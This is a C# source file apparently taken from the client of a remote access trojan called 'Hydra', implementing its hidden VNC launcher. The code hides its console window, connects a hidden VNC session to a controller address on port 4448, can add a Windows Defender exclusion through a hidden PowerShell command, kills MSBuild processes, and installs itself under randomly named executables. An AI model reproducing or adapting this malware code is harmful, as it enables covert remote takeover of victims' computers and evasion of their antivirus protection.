using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Hydra.Hvnc
{
	internal class Exec
	{
		public static FileInfo FileName;

		public static DirectoryInfo DirectoryName;

		public const int SW_HIDE = 0;

		private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

		private static readonly Random random = new Random();

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		public Exec()
		{
			Exec.ShowWindow(Exec.GetConsoleWindow(), 0);
			Random random = new Random();
			string obj = (new string[3] { "0", "1", "2" })[random.Next(0, 3)];
			string identifier = "Hydra";
			string text = Convert.ToString(Program.m_strServerAddr);
			int num = text.IndexOf(":");
			if (num >= 0)
			{
				text = text.Substring(0, num);
			}
			string text2 = Convert.ToString("4448");
			string text3 = "False";
			string path = obj;
			string randomCharacters = Exec.getRandomCharacters();
			string filename = Exec.getRandomCharacters() + ".exe";
			string text4 = "False";
			if (text4 == "True")
			{
				Sucks.suck("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command Add-MpPreference -ExclusionPath '" + Path.Combine(Exec.DirectoryName.FullName, Exec.FileName.Name) + "'");
			}
			Process[] processes;
			if ("False" == "True")
			{
				Sucks.tosuck();
				if (Process.GetProcessesByName("MSBuild").Length == 0)
				{
					HVNC.StartHVNC(identifier, text + " " + text2, "01234567890");
					if (text3 == "True")
					{
						Installer.Run(path, randomCharacters, filename, text4);
					}
					return;
				}
				processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName == "MSBuild")
					{
						Exec.KillHVNC("MSBuild");
						process.Kill();
						break;
					}
				}
				HVNC.StartHVNC(identifier, text + " " + text2, "01234567890");
				if (text3 == "True")
				{
					Installer.Run(path, randomCharacters, filename, text4);
				}
				return;
			}
			if (Process.GetProcessesByName("MSBuild").Length == 0)
			{
				HVNC.StartHVNC(identifier, text + " " + text2, "01234567890");
				if (text3 == "True")
				{
					Installer.Run(path, randomCharacters, filename, text4);
				}
				return;
			}
			processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == "MSBuild")
				{
					Exec.KillHVNC("MSBuild");
					process2.Kill();
					break;
				}
			}
			HVNC.StartHVNC(identifier, text + " " + text2, "01234567890");
			if (text3 == "True")
			{
				Installer.Run(path, randomCharacters, filename, text4);
			}
		}

		public static void StartProcess(string processx)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				UseShellExecute = false,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe",
				Arguments = string.Format("/c " + processx)
			};
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
		}

		public static string getRandomCharacters()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= new Random().Next(10, 20); i++)
			{
				stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[Exec.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length)]);
			}
			return stringBuilder.ToString();
		}

		public static void KillHVNC(string proc)
		{
			List<int> list = new List<int>();
			Process[] processesByName = Process.GetProcessesByName(proc);
			for (int i = 0; i < processesByName.Length; i++)
			{
				list.Add(processesByName[i].Id);
			}
			Exec.StartProcess("taskkill /F /IM " + proc + ".exe");
			Exec.StartProcess("taskkill /PID " + list.Max() + " /F ");
		}
	}
}
